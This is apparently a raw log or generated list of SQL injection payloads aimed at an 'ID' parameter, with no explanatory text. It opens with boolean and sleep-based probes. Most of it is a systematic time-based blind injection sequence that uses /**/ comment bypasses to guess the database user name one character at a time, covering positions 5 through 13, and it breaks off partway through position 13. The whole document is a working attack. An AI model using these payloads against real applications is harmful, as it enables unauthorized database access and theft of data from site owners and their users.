ID:1
ID:1' and select 1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=2-- 
ID:1' and IF(1=1,sleep(5),2)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=97,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=98,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=99,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=100,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=101,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=102,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=103,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=104,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=105,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=106,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=107,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=108,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=109,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=110,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=111,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=112,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=113,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=115,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=116,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=54,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=55,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=56,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=57,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=48,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=46,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=64,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=97,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=98,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=99,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=100,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=101,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=102,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=103,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=104,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=105,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=106,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=107,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=108,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=109,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=110,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=111,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=112,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=113,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=115,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=116,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=54,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=55,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=56,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=57,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=48,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=46,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=64,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),7,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=97,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=98,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=99,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=100,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=101,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=102,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=103,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=104,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=105,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=106,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=107,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=108,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=109,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=110,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=111,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=112,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=113,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=115,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=116,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=54,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=55,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=56,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=57,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=48,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=46,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=64,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),8,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=97,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=98,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=99,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=100,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=101,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=102,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=103,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=104,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=105,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=106,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=107,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=108,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=109,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=110,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=111,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=112,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=113,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=115,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=116,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=54,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=55,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=56,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=57,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=48,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=46,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=64,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),9,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=97,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=98,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=99,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=100,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=101,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=102,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=103,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=104,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=105,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=106,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=107,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=108,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=109,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=110,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=111,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=112,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=113,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=115,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=116,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=54,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=55,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=56,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=57,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=48,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=46,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=64,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=97,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=98,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=99,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=100,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=101,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=102,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=103,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=104,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=105,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=106,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=107,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=108,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=109,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=110,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=111,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=112,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=113,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=115,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=116,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=54,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=55,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=56,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=57,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=48,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=46,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=64,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),11,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=97,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=98,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=99,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=100,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=101,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=102,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=103,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=104,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=105,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=106,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=107,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=108,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=109,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=110,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=111,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=112,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=113,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=115,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=116,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=54,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=55,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=56,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=57,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=48,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=46,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=64,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),12,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=97,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=98,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=99,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=100,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=101,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=102,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=103,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=104,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=105,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=106,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=107,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=108,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=109,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=110,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=111,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=112,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=113,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=115,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=116,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),13,1))=54,sleep(3),1)
